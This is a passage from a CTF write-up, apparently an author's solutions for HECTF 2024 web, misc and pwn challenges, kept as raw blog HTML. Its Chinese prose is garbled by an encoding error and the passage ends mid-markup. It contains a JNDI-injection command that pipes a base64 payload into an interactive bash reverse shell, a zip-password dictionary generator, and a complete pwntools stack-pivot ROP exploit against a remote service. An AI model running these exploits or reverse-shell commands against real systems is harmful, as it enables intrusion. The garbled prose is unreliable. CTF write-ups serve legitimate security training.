ç»•è¿‡ï¼ˆç½‘ä¸Šçš„æœ‰çš„æ²¡æœ‰å¯¹æ•°å­—è¿›è¡Œç¼–ç ä¼šå¯¼è‡´æŠ¥é”™ï¼Œ å¯å‚è€ƒ P ç¥çš„æ–‡ç«  https://www.leavesongs.com/PENETRATION/utf-8-overlong-encoding.html  ç”¨ python è„š æœ¬ç”Ÿæˆå³å¯ï¼‰</p><p>â€‹åœ¨ vps ä¸Šå¼€å¯ä¸€ä¸ªæ¶æ„çš„æœåŠ¡å™¨ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar JNDI-Injection-Exploit-Plus-2.4-SNAPSHOT-all.jar -C &quot;bash -c &#123;echo,&#125;| &#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span><br></pre></td></tr></table></figure><p>â€‹å¼€å¯åå¼¹ shell ç›‘å¬çš„ç«¯å£ï¼Œæœ€ååœ¨æ ¹ç›®å½•è·å– flag</p><p><img data-src="https://i-blog.csdnimg.cn/direct/d1555696b9964e9397405fd9cab4f124.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h2 id="misc"><a class="markdownIt-Anchor" href="#misc">#</a> Miscï¼š</h2><h3 id="ç®€å•çš„å‹ç¼©åŒ…"><a class="markdownIt-Anchor" href="#ç®€å•çš„å‹ç¼©åŒ…">#</a> ç®€å•çš„å‹ç¼©åŒ…ï¼š</h3><p>â€‹æ‰“å¼€ä¹‹åæœ‰ä¸ª Reï¼Œæ‰“å¼€å‘ç°æ˜¯ä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">^([a-z])&#123;<span class="number">2</span>&#125;\d\d([^a-z])$</span><br></pre></td></tr></table></figure><p>â€‹å‰é¢ä¸¤ä¸ªæ˜¯å­—ç¬¦ï¼Œç¬¬ä¸‰å››ä¸ªæ˜¯æ•°å­—ï¼Œç¬¬äº”ä¸ªä¸æ˜¯å°å†™å­—æ¯ï¼Œæ ¹æ®è¿™ä¸ªç”Ÿæˆä¸ªå­—å…¸ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">str_12 = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz&quot;</span></span><br><span class="line">digit = <span class="string">&quot;0123456789&quot;</span></span><br><span class="line">str_4 = <span class="string">&quot;&quot;&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!&quot;#$&amp;&#x27;()*+,-./:;&lt;=&gt;?@[\]^_`&#123;|&#125;~&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;dict.txt&quot;</span>,<span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> str_12:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> str_12:</span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> digit:</span><br><span class="line">                <span class="keyword">for</span> m <span class="keyword">in</span> digit:</span><br><span class="line">                    <span class="keyword">for</span> n <span class="keyword">in</span> str_4:</span><br><span class="line">                        dic =i+j+k+m</span><br><span class="line">                        f.write(dic+<span class="string">&quot;\n&quot;</span>)</span><br></pre></td></tr></table></figure><p>â€‹ä¹‹åæ‹¿ç€è¿™ä¸ªå»çˆ†ç ´ï¼Œçˆ†ç ´åˆ°å¯†ç ï¼Œä¸è¿‡è¿™é‡Œéé¢„æœŸäº†ï¼Œç«Ÿç„¶å¯ä»¥ç”¨æ˜æ–‡æ”»å‡»ï¼Œå¸ˆå‚…ä»¬ç®€ç›´å¤ªå¼ºäº†ï¼Œä¸è¿‡è¿™é‡Œå› ä¸ºå¤±å»æŸäº›ä¿¡æ¯å¯¼è‡´çˆ†ç ´éš¾åº¦å¢å¤§ä¹Ÿæ˜¯æˆ‘çš„é”…ï¼š</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">np76_</span><br></pre></td></tr></table></figure><p>â€‹ä¹‹åå°±æ˜¯ pngï¼Œwinhex å‘ç°è—äº†æœ‰æ–‡ä»¶ï¼Œforemost åˆ†ç¦»ï¼Œåˆ†ç¦»åçœ‹åˆ°äº†ä¸ª py æ–‡ä»¶å’Œä¸€ä¸ªå‹ç¼©åŒ…ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad, unpad</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">key,iv</span>):</span><br><span class="line">    data = content</span><br><span class="line">    cipher1 = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">    ct = cipher1.encrypt(pad(data, <span class="number">16</span>))</span><br><span class="line">    ct_hex = binascii.b2a_hex(ct)</span><br><span class="line">    <span class="keyword">return</span> ct_hex</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;oringe.zip&quot;</span>,<span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    content = f.read()</span><br><span class="line"></span><br><span class="line">key = <span class="string">b&quot;abcdefghijklmnop&quot;</span></span><br><span class="line">iv  = <span class="string">b&quot;qwertyuiopasdfgh&quot;</span></span><br><span class="line"></span><br><span class="line">en = encrypt(key,iv)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;zip2.zip&quot;</span>,<span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(en)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>â€‹æ˜¾ç„¶ï¼Œå‹ç¼©åŒ…è¢«åŠ å¯†äº†ï¼ŒAES åŠ å¯†å’Œ key éƒ½æœ‰ï¼Œç›´æ¥æ‰“ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad, unpad</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">ct_hex,key,iv</span>):</span><br><span class="line">    cipher2 = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">    hex_data = binascii.a2b_hex(ct_hex)</span><br><span class="line">    pt = unpad(cipher2.decrypt(hex_data), <span class="number">16</span>)</span><br><span class="line">    <span class="keyword">return</span> pt</span><br><span class="line"></span><br><span class="line">key = <span class="string">b&quot;abcdefghijklmnop&quot;</span></span><br><span class="line">iv  = <span class="string">b&quot;qwertyuiopasdfgh&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># åŠ å¯†çš„zipæ–‡ä»¶</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;jiami.zip&quot;</span>,<span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    endata = f.read()</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ–°å»ºçš„è§£å¯†zipæ–‡ä»¶</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;jiemi.zip&quot;</span>,<span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    dedata = decrypt(endata,key,iv)</span><br><span class="line">    f.write(dedata)</span><br></pre></td></tr></table></figure><p>â€‹9 è§£å‹åå°±æœ‰ flag äº†ã€‚</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HECTF&#123;c292af1-2b2ee35-6398bd4934f7626afc&#125;</span><br></pre></td></tr></table></figure><p>â€‹</p><h2 id="pwn"><a class="markdownIt-Anchor" href="#pwn">#</a> Pwn</h2><h3 id="sign-in"><a class="markdownIt-Anchor" href="#sign-in">#</a> sign in</h3><p>â€‹æ£€æŸ¥æ— ä¿æŠ¤ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">g01den@MSI:/mnt/c/Users/20820/Downloads/attachment$ checksec pwn</span><br><span class="line">[*] &#x27;/mnt/c/Users/20820/Downloads/attachment/pwn&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">10</span>]; <span class="comment">// [rsp+8h] [rbp-18h] BYREF</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">10</span>]; <span class="comment">// [rsp+12h] [rbp-Eh] BYREF</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;please sign in!!!!&quot;</span>);</span><br><span class="line">  gets(s);</span><br><span class="line">  v6 = <span class="built_in">strlen</span>(s);</span><br><span class="line">  <span class="keyword">if</span> ( v6 &gt; <span class="number">8</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;overflow&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Enter your key&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0xA</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(buf, m, <span class="number">0xA</span>uLL) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;login--------&quot;</span>);</span><br><span class="line">    close(<span class="number">1</span>);</span><br><span class="line">    backd00r();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹ä¸¤ä¸ªåŠæ³•ï¼š</p><p><strong>æ–¹æ³•ä¸€ï¼š</strong></p><p>â€‹gets æ²¡æœ‰èƒ½é€ æˆæ ˆæº¢å‡ºï¼Œç”¨ \x00 å¯ä»¥ç»•è¿‡ strlen çš„æ¯”è¾ƒï¼Œå¯ä»¥ç›´æ¥æº¢å‡ºåŠ«æŒ rip åˆ° backd00rï¼Œè¿™é‡Œå°±ä¸ç»™ exp äº†ã€‚</p><p><strong>æ–¹æ³•äºŒï¼š</strong></p><p>â€‹å¯»å¸¸ç»• close (1)ï¼Œkey ä¸º HECTF!ï¼Œä¹‹å sh flag æŠ¥é”™å¸¦å‡ºæ¥å³å¯ã€‚</p><h3 id="find-eggy"><a class="markdownIt-Anchor" href="#find-eggy">#</a> find eggyï¼š</h3><p>â€‹å¯»å¸¸æ ˆè¿ç§»ï¼Œæ¼æ´åœ¨ check å‡½æ•°é‡Œï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">check</span><span class="params">(__int16 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">28</span>]; <span class="comment">// [rsp+10h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+2Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(aKaka);</span><br><span class="line">  <span class="keyword">if</span> ( a1 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(&amp;byte_4020A8);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;-------       --------\n&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;||||||||       |||||||| \n&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;                         \n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;           V              \n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Success!&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Don&#x27;t touch me!&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( read(<span class="number">0</span>, &amp;s, <span class="number">0x70</span>uLL) &lt;= <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      perror(<span class="string">&quot;read error&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;TvT&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( read(<span class="number">0</span>, buf, <span class="number">0x30</span>uLL) &lt;= <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      perror(<span class="string">&quot;read error&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    v1 = atoi(buf);</span><br><span class="line">    v4 = calculate_sum_of_factors(v1);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;The sum of factors of %s is %d\n&quot;</span>, buf, v4);</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(buf, <span class="string">&quot;12345&quot;</span>) &amp;&amp; v4 == <span class="number">15616</span> )</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Congratulations! You found the flag&#123;this is flag&#125;&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;yes!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹ä¸¤æ¬¡è¯»å–ï¼Œç¬¬ä¸€æ¬¡è¯»åˆ° bss æ®µä¸Šï¼Œç¬¬äºŒæ¬¡åœ¨æ ˆä¸Šï¼Œä½†æ˜¯ç¬¬äºŒæ¬¡é™åˆ¶äº†è¯»å–å¤§å°ï¼Œä¸è¶³ä»¥æ„é€  ROP é“¾ï¼Œæ‰€ä»¥æ ˆè¿ç§»åˆ° bss æ®µä¸Šï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;0.0.0.0&#x27;</span>,<span class="number">9393</span>)</span><br><span class="line">s = <span class="number">0x405600</span></span><br><span class="line">system = <span class="number">0x4015ad</span></span><br><span class="line">binsh = <span class="number">0x403680</span></span><br><span class="line">rdi = <span class="number">0x401326</span></span><br><span class="line">leave = <span class="number">0x4014c0</span></span><br><span class="line">ret = <span class="number">0x40101a</span></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">b&#x27;-983040&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.recvuntil(<span class="string">b&quot;Don&#x27;t touch me!&quot;</span>)</span><br><span class="line">pay = p64(rdi) +p64(binsh) +p64(ret) +p64(system)</span><br><span class="line">p.sendline(pay)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;TvT&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span> +p64(s-<span class="number">8</span>)+p64(leave)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="arcaea_sorting"><a class="markdownIt-Anchor" href="#arcaea_sorting">#</a> Arcaea_Sortingï¼š</h3><p>â€‹ç¬¬ä¸€æ¬¡å‡ºé¢˜ï¼Œè¸©å‘å¤ªå¤šäº†ï¼Œè¿™æ¬¡å·®ç‚¹å„¿ç»™è‡ªå·±å¼„åºŸäº†ï¼Œä¸è¿‡å¥½æ­¹æ˜¯å‡ºå‡ºæ¥äº†ï¼Œå‘å•Šï¼Œå…¨æ˜¯å‘ã€‚</p><p>â€‹é¦–å…ˆæ˜¯ checksec ä¸€ä¸‹ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">g01den@MSI:~/CTest/HECTF2024/pwn3$ checksec pwn</span><br><span class="line">[*] &#x27;/home/g01den/CTest/HECTF2024/pwn3/pwn&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p>â€‹åˆ«é—®ä¸ºå•¥æ˜¯ 32 ä½çš„ï¼Œå› ä¸º 32 ä½åœ¨ strspy é‚£é‡Œè¿‡ä¸äº†ï¼Œå¾—ç”¨å…¶ä»–æ“ä½œï¼Œä¸æ˜¯æˆ‘æƒ³è€ƒçš„ç‚¹ï¼Œæ‰€ä»¥è¿™é‡Œå°±åªæœ‰è€ƒ 32 ä½äº†ã€‚</p><p>â€‹ç©å„¿è¿‡ Arcaea çš„åº”è¯¥éƒ½çŸ¥é“ï¼Œè¿™ä¸ªç¨‹åºå¤§æ¦‚æœ‰å•¥ç”¨ï¼Œåˆ«çš„ä¸è¯´ï¼Œå…ˆè·‘ä¸€ä¸‹çœ‹çœ‹ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Welcome to the Arcaea Query developed by g01den, which is currently in the development stage</span><br><span class="line">    ___</span><br><span class="line">   /   |  ______________ ____  ____ _</span><br><span class="line">  / /| | / ___/ ___/ __ `/ _ \/ __ `/</span><br><span class="line"> / ___ |/ /  / /__/ /_/ /  __/ /_/ /</span><br><span class="line">/_/  |_/_/   \___/\__,_/\___/\__,_/</span><br><span class="line">If you find any questions, please do not contact g01den for resolution</span><br><span class="line">I would like to know your complete PTT (Potential Value), would it be convenient for you to tell me?</span><br></pre></td></tr></table></figure><p>â€‹è¿™é‡Œé¦–å…ˆæ˜¯è®©æˆ‘ä»¬è¾“å…¥è‡ªå·±çš„å®šæ•°ï¼Œä¹‹ååšå•¥å¤„ç†æ²¡é™æ€ä¸æ¸…æ¥šï¼Œéšä¾¿è¾“å…¥ä¸€ä¸ª 12 çœ‹çœ‹ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">10</span><br><span class="line">Come on, the flowers are purple and about to turn red. You will step onto the ladder of the big shots</span><br><span class="line">=======Please select the following options to use the relevant functions========</span><br><span class="line">1. If the score is qualified, it will be stored in B30</span><br><span class="line">2. Calculate single PTT</span><br><span class="line">3. Calculate player PTT through b30</span><br><span class="line">4. Give your favorite song a vote</span><br><span class="line">5. View voted songs</span><br><span class="line">6. Output all content of b30</span><br><span class="line">7. Exit the system</span><br></pre></td></tr></table></figure><p>â€‹å¤§æ¦‚æœ‰å•¥ç”¨åº”è¯¥ä»å­—é¢ä¸Šåº”è¯¥èƒ½æ‡‚ï¼š</p><ol><li>åŠŸèƒ½é”® 1 æ˜¯ç®—æ­Œæ›²åˆ†æ•°å’Œå•æ›² ptt ç„¶ååŠ å…¥ b30ï¼Œå…·ä½“é€»è¾‘æ˜¯å¦æ­£ç¡®æˆ‘ä¸æ˜¯å¾ˆæ¸…æ¥šï¼Œä½†æµ‹è¯•çš„æ—¶å€™æ²¡å•¥å¤ªå¤§çš„é—®é¢˜ã€‚</li><li>åŠŸèƒ½é”® 2 æ˜¯è®¡ç®—å•æ›² ptt å¹¶è¾“å‡º</li><li>åŠŸèƒ½é”® 3 æ˜¯ä» b30 é‡Œè®¡ç®—å‡ºç©å®¶ pttï¼Œä¸è®¡ç®— r10ï¼Œæ‰€ä»¥åªèƒ½åšå‚è€ƒ</li><li>åŠŸèƒ½é”® 5 æ˜¯ç»™æœ€å–œæ¬¢çš„è°±å­æŠ•ç¥¨</li><li>åŠŸèƒ½é”® 5 æ˜¯è¾“å‡ºæŠ•çš„ç¥¨çš„æ­Œæ›²åå­—</li><li>åŠŸèƒ½é”® 5 æ˜¯è¾“å‡ºæ‰€æœ‰ b30 çš„å†…å®¹</li><li>åŠŸèƒ½é”® 7 æ˜¯æ¨å‡ºè¿™ä¸ªç³»ç»Ÿ</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line">=======Please select the following options to use the relevant functions========</span><br><span class="line">1. If the score is qualified, it will be stored in B30</span><br><span class="line">2. Calculate single PTT</span><br><span class="line">3. Calculate player PTT through b30</span><br><span class="line">4. Give your favorite song a vote</span><br><span class="line">5. View voted songs</span><br><span class="line">6. Output all content of b30</span><br><span class="line">7. Exit the system</span><br><span class="line">1</span><br><span class="line">Please enter the exact number of songs you want to query:11.5</span><br><span class="line"></span><br><span class="line">Please enter your score for this spectrum:10000000</span><br><span class="line"></span><br><span class="line">The single PTT is 13.500000, you still need to keep working hard. Even if you PM, it&#x27;s the same. You can&#x27;t be proud anymore</span><br><span class="line">=======Please select the following options to use the relevant functions========</span><br><span class="line">1. If the score is qualified, it will be stored in B30</span><br><span class="line">2. Calculate single PTT</span><br><span class="line">3. Calculate player PTT through b30</span><br><span class="line">4. Give your favorite song a vote</span><br><span class="line">5. View voted songs</span><br><span class="line">6. Output all content of b30</span><br><span class="line">7. Exit the system</span><br><span class="line">6</span><br><span class="line">rating = 13.500000,music = 11.500000</span><br><span class="line">=======Please select the following options to use the relevant functions========</span><br><span class="line">1. If the score is qualified, it will be stored in B30</span><br><span class="line">2. Calculate single PTT</span><br><span class="line">3. Calculate player PTT through b30</span><br><span class="line">4. Give your favorite song a vote</span><br><span class="line">5. View voted songs</span><br><span class="line">6. Output all content of b30</span><br><span class="line">7. Exit the system</span><br><span class="line">3</span><br><span class="line">Your PTT is13.500000</span><br><span class="line">=======Please select the following options to use the relevant functions========</span><br><span class="line">1. If the score is qualified, it will be stored in B30</span><br><span class="line">2. Calculate single PTT</span><br><span class="line">3. Calculate player PTT through b30</span><br><span class="line">4. Give your favorite song a vote</span><br><span class="line">5. View voted songs</span><br><span class="line">6. Output all content of b30</span><br><span class="line">7. Exit the system</span><br><span class="line">3</span><br><span class="line">Your PTT is13.500000</span><br><span class="line">=======Please select the following options to use the relevant functions========</span><br><span 